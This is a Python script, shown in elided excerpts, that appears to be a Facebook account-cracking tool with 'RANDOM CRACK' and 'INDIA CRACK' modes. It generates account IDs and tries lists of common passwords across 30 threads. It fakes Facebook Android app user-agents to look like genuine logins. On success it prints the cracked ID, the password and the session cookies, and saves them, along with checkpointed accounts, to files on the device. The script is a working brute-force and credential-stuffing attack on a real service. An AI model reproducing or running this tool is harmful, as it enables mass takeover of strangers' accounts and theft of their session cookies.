...
BC = "\033[1;0m"
loooop = 0
#.  os.system("xdg-open https://github.com/m4h1m")
os.system('clear')
def __banner___():
    print(f"""
\033[1;92m╔══════════╦═════════════════════════════════╗
║\033[1;32m╔═╗\033[1;31m═╗ ╦\033[1;32m╔╦╗\033[1;92m║ \033[1;96mOWNER    : M4H1M-SH1PON        \033[1;92m ║
║\033[1;32m╚═╗\033[1;31m╔╩╦╝\033[1;32m║║║\033[1;92m║ \033[1;96mFACEBOOK : নাপা এক্সট্রা/MD shipon\033[1;92m║
║\033[1;32m╚═╝\033[1;31m╩ ╚═\033[1;32m╩ ╩\033[1;92m║ \033[1;96mGITHUB   : M4H1M         \033[1;92m       ║
╠══════════╩════╦═════════════╦══════════════╣
║\033[1;31mTOOLS TYPE:FREE\033[1;92m║\033[1;96m VERSION:0.1 \033[1;92m║ \033[1;96mRANDOM CLONE \033[1;92m║
╚═══════════════╩═════════════╩══════════════╝""")
os.system('clear')
...
def main():
   ...
   ## print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mFILE CRACKING ")
    print(f"\033[1;92m[\033[1;96m1\033[1;92m] \033[1;92mRANDOM CRACK ")
    print(f"\033[1;92m[\033[1;96m2\033[1;92m] \033[1;92mINDIA CRACK")
    # print(f"\033[1;37m[\033[1;36mE\033[1;37m] \033[1;37mCONTACT WITH CREATOR ")
    print(f"\033[1;92m[\033[1;96m0\033[1;92m] \033[1;92mEXIT ")
    linex()
    arifin= input('\033[1;32m[\033[1;96m>\033[1;32m] \033[1;92mSELECT : ')
    if arifin in ['4','01','A','a']:
        ___mix___()
    elif arifin in ['1','02','B','b']:
        ___mix___()
    elif arifin in ['2','03','C','c']:
        #  os.system('xdg-open https://facebook.com/groups/6461836883871705/')
        __ind__()
...
#. os.system("xdg-open https://www.facebook.com/iam.arifinrashid")
  ...
  # os.system('xdg-open https://github.com/ARIFIN-212')
    ...
    #.  os.system('xdg-open https://www.facebook.com/profile.php?id=100095114791542')
    ...
    with tred(max_workers=30) as ___mal___:
        ...
        __banner___()
        tl = len(user) 
        print(f"\033[1;92m[\033[1;96m=\033[1;92m]\033[1;92m TOTAL CRACK \033[1;92m : {limit}")
        print('\033[1;92m[\033[1;96m=\033[1;92m]\033[1;92m SIM CODE\033[1;92m     : '+code)
        print('\033[1;92m[\033[1;96m=\033[1;92m]\033[1;92m USE APN FOR BETTER RESULT')
        linex()
        for love in id:
           ...
           bu = ids[:8] #1st 8digit
           pwv = [love,au,bu,"sadiya","taniya","mababa","jannat","bristy","alamin","sabbir","shakib","farjana","sultana","afsana",]
...
def uaa():
    ...
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/392.3.2.700;FBBV/377255012;FBDM/{density=3.2,width=1295,height=2030};FBLC/en_IN;FBRV/377349226;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/XPH5672;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
def uaa():
...
def uaa():
    ...
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = "[FBAN/FB4A;FBAV/430.0.0.23.113;FBBV/445008976;FBDM/{density=2.75,width=1080,height=2062};FBLC/en_US;FBRV/445008976;FBCR/A-Mobile;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 6 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
ugen=[]
def uaa():
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;32m[\033[1;92mCracking\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
    ...
    'viewport-width': '980',}  
            ...
            if 'access_token' in po:
                ...
                print(f'\r\033[1;92m[\033[1;96m=\033[1;92m]\33[1;94m[Cracked] '+ids+' = '+pas+'\033[1;92m')
                print(f"\r\33[1;35mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/LUCKY-OKS.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/HAMIM-COOKIE','a').write(kuki+'\n')
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        print('\r\r\033[1;30m [checkpoint] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAMIM-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
